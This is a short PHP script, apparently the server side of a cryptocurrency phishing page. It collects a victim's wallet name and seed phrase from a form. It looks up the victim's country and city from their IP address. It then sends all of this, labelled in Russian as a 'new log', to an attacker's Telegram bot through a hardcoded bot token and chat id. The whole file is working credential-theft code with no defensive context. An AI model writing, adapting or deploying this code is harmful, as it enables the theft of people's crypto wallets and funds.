<?php
    $name = $_POST['name'];
    $phrase = $_POST['phrase'];

    if ($phrase == '' || $name == '') {
      return;
    } else {
      $ip = $_SERVER['REMOTE_ADDR'];
      $NowDomen = $_SERVER['SERVER_NAME'];
      $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
      $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
  
      // bot telegram
      $token = " 7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0
";
      $chat_id = "-4734890479";
  
      // message
      $arr = array(
          "💸 Поздравляем, новый лог!" => $emptyMess,
          "💵 Кошелёк: " => $name,
          "🔑 SEED Фраза: " => $phrase,
          "🗻 IP: " => $ip,
          "🌍 Страна: " => $NowCountry,
          "🌇 Город: " => $NowCity,
          "🔧 Домен: " => $NowDomen
      );
  
      // foreach for array
      foreach($arr as $key => $value) {
        $txt .= "<b>".$key."</b> ".$value."%0A";
      };
    
      // sending message
      $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

      echo true;
    }